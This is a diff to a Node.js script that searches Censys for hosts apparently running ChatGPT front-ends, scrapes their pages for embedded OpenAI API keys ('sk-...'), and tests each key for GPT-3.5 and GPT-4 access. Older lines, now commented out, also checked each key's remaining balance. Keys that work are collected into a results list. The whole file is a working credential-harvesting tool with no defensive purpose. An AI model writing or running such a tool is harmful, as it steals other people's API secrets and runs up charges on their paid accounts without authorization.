@@ -6,15 +6,13 @@ const http = require('http')
 const fs = require('fs')
 
 const target = 'chat+gpt+4'
-let cursor = ''
-let page = 1;
 const timeout = 30000
-const continueTask = true
+const continueTask = false
 
 const censysStorageDir = `task/${target}/censys`
 const resultStorageDir = `task/${target}/result`
 
-const request = () => {
+const request = (cursor) => {
     return new Promise((resolve, reject) => {
         let data = ''
         const req = https.get(`https://search.censys.io/api/v2/hosts/search?per_page=100&virtual_hosts=EXCLUDE&q=${target}&cursor=${cursor}`, {
@@ -37,7 +35,8 @@ const HttpRequest = {
         return new Promise((resolve, reject) => {
             let data = ''
             const req = http.get(url, {
-                timeout
+                timeout,
+                sessionTimeout: timeout
             }, (res) => {
                 res.on('data', (chunk) => {
                     // console.log('chunk:', chunk.toString())
@@ -63,6 +62,7 @@ const HttpRequest = {
             const req = https.get(url, {
                 rejectUnauthorized: false,
                 timeout,
+                sessionTimeout: timeout
             }, (res) => {
                 res.on('data', (chunk) => {
                     // console.log('chunk:', chunk.toString())
@@ -250,13 +250,15 @@ class OpenAi {
 
 // 函数实现，参数单位 毫秒 ；
 function wait(ms) {
-    return new Promise(resolve =>setTimeout(() =>resolve(), ms));
+    return new Promise(resolve =>setTimeout(() => resolve(), ms));
 };
 
 (async () => {
     // 先抓取censys搜索结果
     console.log('start')
     let crawler = true
+    let cursor = ''
+    let page = 1;
     try {
         fs.mkdirSync(censysStorageDir, { recursive: true })
     } catch (error) {
@@ -270,7 +272,7 @@ function wait(ms) {
     }
 
     while(crawler) {
-        const resp = await request()
+        const resp = await request(cursor)
         
         const { next } = resp.result.links
         // console.log('resp:', resp)
@@ -317,6 +319,7 @@ function wait(ms) {
             const httpServices = services.filter(e=>e.service_name === 'HTTP')
             for(const service of httpServices) {
                 let newData = null
+                let token = ''
                 try {
                     console.log('处理：', `${service.extended_service_name}://${ip}:${service.port}`)
                     const html = await HttpRequest[service.extended_service_name](`${service.extended_service_name}://${ip}:${service.port}`)
@@ -329,10 +332,10 @@ function wait(ms) {
                     if (m == null){
                         console.log('匹配失败', html)
                     }
-                    const token = `sk-${m[1]}`
+                    token = `sk-${m[1]}`
                     console.log('token:', token)
                     const ai = new OpenAi(token)
-                    console.log('getModelList...')
+                    console.log(`${token}:`, 'getModelList...')
                     const modelList = await ai.getModelList()
                     await wait(500);
                     // console.log('modelList:', modelList)
@@ -340,34 +343,34 @@ function wait(ms) {
                     // console.log('idList:', idList)
                     const isSupportGPT3 = idList.includes('gpt-3.5-turbo')
                     const isSupportGPT4 = idList.includes('gpt-4')
-                    console.log('支持GPT3.5:', isSupportGPT3)
-                    console.log('支持GPT4:', isSupportGPT4)
+                    console.log(`${token}:`, '支持GPT3.5:', isSupportGPT3)
+                    console.log(`${token}:`, '支持GPT4:', isSupportGPT4)
                     newData = {
                         url: `${ip}:${service.port}`,
                         token,
                         gpt3: isSupportGPT3,
                         gpt4: isSupportGPT4
                     }
-                    console.log('getSubscription...')
-                    const sub = await ai.getSubscription()
-                    // await wait(500);
-                    newData.subscription = sub
+                    // console.log(`${token}:`, 'getSubscription...')
                     // console.log('newData.subscription:', newData.subscription)
                     // console.log('getUsage...')
-                    const usage = await ai.getUsage()
-                    newData.totalUsed = usage.total_usage / 100
-                    console.log('余额:', sub.hard_limit_usd, ' - ', newData.totalUsed, ' = ', sub.hard_limit_usd - newData.totalUsed)
-                    if(sub.hard_limit_usd - newData.totalUsed < 0) {
-                        console.log('余额用完了')
-                        newData = null
-                    }
+                    // const usage = await ai.getUsage()
+                    // newData.totalUsed = usage.total_usage / 100
+                    // const sub = await ai.getSubscription()
+                    // // await wait(500);
+                    // newData.subscription = sub
+                    // console.log(`${token}:`, '余额:', sub.hard_limit_usd, ' - ', newData.totalUsed, ' = ', sub.hard_limit_usd - newData.totalUsed)
+                    // if(sub.hard_limit_usd - newData.totalUsed < 0) {
+                    //     console.log(`${token}:`, '余额用完了')
+                    //     newData = null
+                    // }
                     // newData.usage = usage
                     // console.log('newData.usage:', newData.usage)
 
                     // 调用方法；
                     await wait(500);
                 }catch(err) {
-                    console.error(`${service.extended_service_name}://${ip}:${service.port}error:`, err)
+                    console.error(`${token}:`, `${service.extended_service_name}://${ip}:${service.port}error:`, err)
                 }finally{
                     if (newData !== null)
                         result.push(newData)
